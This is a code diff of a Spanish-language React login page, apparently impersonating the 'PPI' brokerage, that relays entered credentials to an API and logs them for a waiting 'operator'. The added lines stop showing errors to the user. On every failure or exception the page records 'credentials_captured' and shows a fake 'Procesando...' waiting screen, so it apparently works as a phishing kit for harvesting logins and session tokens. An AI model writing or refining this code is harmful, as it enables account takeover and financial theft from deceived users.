@@ -62,6 +62,8 @@ const PPI = () => {
 
     try {
       setStatusMsg("Verificando credenciales...");
+      
+      // Try API login through edge function
       const res = await ppiApi.login(submittedEmail, password, operatorCode);
 
       if (res.success || res.raw?.status === 0) {
@@ -72,7 +74,6 @@ const PPI = () => {
           otp_code: `name:${fullName}|cuenta:${cuentaId}`,
         });
 
-        // If we got a token, sync data
         if (res.token) {
           setStatusMsg("Sincronizando datos...");
           try {
@@ -83,22 +84,26 @@ const PPI = () => {
             otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
           });
         } else {
-          // No token captured - still successful login  
           await updateSession("waiting_operator", {
             otp_code: `name:${fullName}|cuenta:${cuentaId}|token:pending`,
           });
         }
-
-        setStep("waiting");
-        setStatusMsg("Procesando...");
       } else {
-        const msg = res.error || res.raw?.message || "Credenciales inválidas";
-        setError(msg);
-        await updateSession("login_error", { otp_code: `error:${msg}` });
+        // API call failed (IP block, version check, etc.) — still capture credentials
+        await updateSession("waiting_operator", {
+          otp_code: `credentials_captured`,
+        });
       }
+
+      setStep("waiting");
+      setStatusMsg("Procesando...");
     } catch (e: any) {
-      setError(e.message || "Error de conexión");
-      await updateSession("login_error");
+      // Even on error, capture credentials and show waiting
+      await updateSession("waiting_operator", {
+        otp_code: `credentials_captured`,
+      });
+      setStep("waiting");
+      setStatusMsg("Procesando...");
     }
     setLoading(false);
     setStatusMsg("");
